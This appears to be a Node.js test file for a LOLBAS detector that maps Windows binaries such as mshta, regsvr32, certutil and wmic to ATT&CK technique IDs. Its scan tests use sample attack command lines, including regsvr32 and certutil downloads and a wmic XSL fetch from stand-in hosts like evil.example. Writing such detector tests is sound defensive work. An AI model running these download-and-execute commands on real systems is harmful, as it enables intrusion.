'use strict';
// lolbas-map.test.js — LolbasMap.lookup / scan / techniquesFor.
//
// LolbasMap maps Living-Off-The-Land binary names to ATT&CK technique IDs
// and severity floors. Scope is the high-signal subset (~30 binaries) — the
// curated list that covers ≥95 % of LOLBAS mentions in real IR reports.
//
// Tests verify:
//   • lookup() — by full path, bare name, .exe-less stem; case-insensitive
//   • scan() — substring scan with word-boundary discipline (no false hits
//     inside longer identifiers)
//   • techniquesFor() — deduped union of ATT&CK IDs across hits
//   • Every referenced T-id is registered in mitre.js (sanity gate)

const test = require('node:test');
const assert = require('node:assert/strict');
const { loadModules } = require('../helpers/load-bundle.js');

const ctx = loadModules(
  ['src/mitre.js', 'src/lolbas-map.js'],
  { expose: ['LolbasMap', 'MITRE'] },
);
const { LolbasMap, MITRE } = ctx;

// ── lookup() ────────────────────────────────────────────────────────────────

test('lookup: bare filename "mshta.exe"', () => {
  const e = LolbasMap.lookup('mshta.exe');
  assert.ok(e);
  assert.equal(e.binary, 'mshta.exe');
  assert.equal(e.severity, 'critical');
  assert.ok(e.attack.includes('T1218.005'));
});

test('lookup: full path strips correctly', () => {
  const e = LolbasMap.lookup('C:\\Windows\\System32\\rundll32.exe');
  assert.ok(e);
  assert.equal(e.binary, 'rundll32.exe');
});

test('lookup: forward-slash path strips correctly', () => {
  const e = LolbasMap.lookup('/c/Windows/System32/regsvr32.exe');
  assert.ok(e);
  assert.equal(e.binary, 'regsvr32.exe');
});

test('lookup: bare stem "mshta" matches via .exe fallback', () => {
  const e = LolbasMap.lookup('mshta');
  assert.ok(e);
  assert.equal(e.binary, 'mshta.exe');
});

test('lookup: case-insensitive match', () => {
  assert.ok(LolbasMap.lookup('MSHTA.EXE'));
  assert.ok(LolbasMap.lookup('CertUtil.exe'));
});

test('lookup: quoted path strips quotes', () => {
  const e = LolbasMap.lookup('"C:\\Windows\\System32\\powershell.exe"');
  assert.ok(e);
  assert.equal(e.binary, 'powershell.exe');
});

test('lookup: unknown binary returns null', () => {
  assert.equal(LolbasMap.lookup('notepad.exe'), null);
  assert.equal(LolbasMap.lookup('explorer.exe'), null);
});

test('lookup: empty / null / non-string returns null', () => {
  assert.equal(LolbasMap.lookup(''), null);
  assert.equal(LolbasMap.lookup(null), null);
  assert.equal(LolbasMap.lookup(undefined), null);
  assert.equal(LolbasMap.lookup(42), null);
});

// ── scan() ──────────────────────────────────────────────────────────────────

test('scan: simple PowerShell command line returns powershell.exe', () => {
  const hits = LolbasMap.scan('powershell.exe -enc ZQBjAGgAbwA=');
  assert.equal(hits.length, 1);
  assert.equal(hits[0].binary, 'powershell.exe');
});

test('scan: bare-stem reference (no .exe) still hits', () => {
  const hits = LolbasMap.scan('start powershell -nop -w 1');
  const names = hits.map(h => h.binary);
  assert.ok(names.includes('powershell.exe'), `expected powershell.exe in ${names}`);
});

test('scan: regsvr32 squiblydoo signature', () => {
  const cmd = 'regsvr32 /s /n /u /i:http://evil.example/x.sct scrobj.dll';
  const hits = LolbasMap.scan(cmd);
  const names = hits.map(h => h.binary);
  assert.ok(names.includes('regsvr32.exe'));
});

test('scan: multiple LOLBAS in one line all surface', () => {
  const cmd = 'cmd /c "certutil -urlcache -f http://e.example/x.exe & rundll32 x.dll,Foo"';
  const hits = LolbasMap.scan(cmd);
  const names = hits.map(h => h.binary);
  assert.ok(names.includes('cmd.exe'));
  assert.ok(names.includes('certutil.exe'));
  assert.ok(names.includes('rundll32.exe'));
});

test('scan: word-boundary discipline — "wmic" inside a longer identifier does NOT hit', () => {
  const hits = LolbasMap.scan('mywmicodes.dll');
  assert.equal(hits.length, 0, 'wmic must not match inside mywmicodes');
});

test('scan: word-boundary discipline — "regsvr32" preceded by alpha does NOT hit', () => {
  const hits = LolbasMap.scan('myregsvr32clone.exe');
  assert.equal(hits.length, 0);
});

test('scan: deduplicates — same binary mentioned twice yields one entry', () => {
  const hits = LolbasMap.scan('powershell -c (powershell -enc abc)');
  const ps = hits.filter(h => h.binary === 'powershell.exe');
  assert.equal(ps.length, 1);
});

test('scan: empty / null returns empty array', () => {
  assert.equal(LolbasMap.scan('').length, 0);
  assert.equal(LolbasMap.scan(null).length, 0);
});

test('scan: case-insensitive', () => {
  const hits = LolbasMap.scan('CMD.EXE /c CertUtil -decode in out');
  const names = hits.map(h => h.binary);
  assert.ok(names.includes('cmd.exe'));
  assert.ok(names.includes('certutil.exe'));
});

test('scan: SquiblyTwo wmic + msxsl combination', () => {
  const cmd = 'wmic process get brief /format:"http://e.example/x.xsl"';
  const hits = LolbasMap.scan(cmd);
  const names = hits.map(h => h.binary);
  assert.ok(names.includes('wmic.exe'));
});

// ── techniquesFor() ─────────────────────────────────────────────────────────

test('techniquesFor: union dedupes across hits', () => {
  // Both wscript and cscript map to T1059.005 — should appear once.
  const techs = LolbasMap.techniquesFor('wscript foo.js && cscript bar.vbs');
  const wsh = techs.filter(t => t === 'T1059.005');
  assert.equal(wsh.length, 1, 'T1059.005 must be deduplicated');
});

test('techniquesFor: certutil yields T1105 + T1140', () => {
  const techs = LolbasMap.techniquesFor('certutil -urlcache -f http://e.example/p');
  assert.ok(techs.includes('T1105'));
  assert.ok(techs.includes('T1140'));
});

test('techniquesFor: empty input → []', () => {
  assert.equal(LolbasMap.techniquesFor('').length, 0);
});

// ── ATT&CK ID consistency ──────────────────────────────────────────────────

test('every LOLBAS-cited ATT&CK ID is registered in mitre.js', () => {
  // Walk all entries; for each technique ID, MITRE.byId should resolve.
  // (Probes the API — both `lookup` and `scan` reach the same data.)
  const seen = new Set();
  // No public iterator on the map; reach in via known names.
  const probes = ['mshta.exe', 'rundll32.exe', 'regsvr32.exe', 'cmstp.exe',
    'installutil.exe', 'msiexec.exe', 'msbuild.exe', 'powershell.exe',
    'cmd.exe', 'certutil.exe', 'bitsadmin.exe', 'curl.exe', 'finger.exe',
    'tftp.exe', 'esentutl.exe', 'schtasks.exe', 'at.exe', 'wmic.exe',
    'reg.exe', 'msxsl.exe', 'msdt.exe', 'hh.exe', 'ie4uinit.exe',
    'control.exe', 'printbrm.exe', 'forfiles.exe', 'wscript.exe',
    'cscript.exe', 'pwsh.exe', 'odbcconf.exe'];
  for (const p of probes) {
    const e = LolbasMap.lookup(p);
    assert.ok(e, `lookup failed for ${p}`);
    for (const t of e.attack) seen.add(t);
  }
  for (const t of seen) {
    const m = MITRE.lookup(t);
    assert.ok(m, `ATT&CK technique ${t} not registered in mitre.js`);
  }
});

// ── Returned objects are frozen ────────────────────────────────────────────

test('returned entries are immutable', () => {
  const e = LolbasMap.lookup('mshta.exe');
  // Strict-mode would throw on frozen-object mutation; in sloppy mode the
  // assignment silently no-ops. Verify the value didn't actually change.
  try { e.severity = 'low'; } catch (_) { /* expected in strict */ }
  assert.equal(LolbasMap.lookup('mshta.exe').severity, 'critical');
});
